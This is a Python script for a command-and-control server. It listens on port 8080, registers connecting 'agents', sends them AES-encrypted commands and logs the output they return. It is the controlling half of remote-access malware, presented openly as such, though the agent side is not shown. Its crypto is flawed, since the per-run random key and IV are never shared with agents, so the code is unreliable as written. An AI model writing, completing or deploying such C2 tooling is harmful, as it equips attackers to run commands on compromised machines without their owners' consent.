import socket
import threading
import json
import base64
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

# AES encryption utilities
key = get_random_bytes(32)
iv = get_random_bytes(16)

def encrypt(data):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    pad_len = 16 - (len(data) % 16)
    data += ' ' * pad_len
    return base64.b64encode(cipher.encrypt(data.encode()))

def decrypt(data):
    data = base64.b64decode(data)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return cipher.decrypt(data).decode().strip()

# Store connected agents
agents = {}

def handle_agent(conn, addr):
    print(f"[+] New agent connected: {addr}")
    conn.send(encrypt("Hello from C2"))
    agent_id = addr[0] + ":" + str(addr[1])
    agents[agent_id] = conn

    while True:
        try:
            data = conn.recv(4096)
            if not data:
                break
            msg = decrypt(data)
            cmd = json.loads(msg)
            print(f"[{agent_id}] Command Output: {cmd}")
        except Exception as e:
            print(f"[!] Error handling agent {agent_id}: {e}")
            break
    del agents[agent_id]
    conn.close()

def send_command(agent_id, cmd):
    conn = agents.get(agent_id)
    if conn:
        payload = json.dumps({"cmd": cmd})
        conn.send(encrypt(payload))
    else:
        print(f"[!] Agent {agent_id} not found.")

def server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", 8080))
    s.listen(5)
    print("[*] C2 Server listening on port 8080...")

    while True:
        conn, addr = s.accept()
        thread = threading.Thread(target=handle_agent, args=(conn, addr))
        thread.start()

if __name__ == "__main__":
    server()
